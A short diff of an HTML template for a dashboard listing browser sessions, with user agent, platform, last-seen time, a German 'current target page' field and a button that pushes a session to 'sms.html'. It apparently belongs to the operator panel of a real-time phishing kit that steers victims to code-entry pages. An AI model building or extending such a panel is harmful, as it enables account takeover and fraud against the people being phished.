@@ -310,11 +310,6 @@
               <div class="detailValue">${formatTime(s.lastSeen)} · ${timeAgo(s.lastSeen)}</div>
             </div>
 
-            <div class="detail">
-  <div class="detailLabel">Ref</div>
-  <div class="detailValue">${s.ref || "—"}</div>
-</div>
-
 <div class="detail">
   <div class="detailLabel">Browser</div>
   <div class="detailValue">${s.ua || "—"}</div>
@@ -325,16 +320,6 @@
   <div class="detailValue">${s.platform || "—"}</div>
 </div>
 
-<div class="detail">
-  <div class="detailLabel">Aktuelle Zielseite</div>
-  <div class="detailValue">${s.nextPage || "noch nicht gesetzt"}</div>
-</div>
-
-            <div class="detail">
-              <div class="detailLabel">Aktuelle Zielseite</div>
-              <div class="detailValue">${s.nextPage || "noch nicht gesetzt"}</div>
-            </div>
-          </div>
 
           <div class="sessionActions">
             <button class="primary" type="button" data-id="${s.sessionId}" data-target="sms.html">
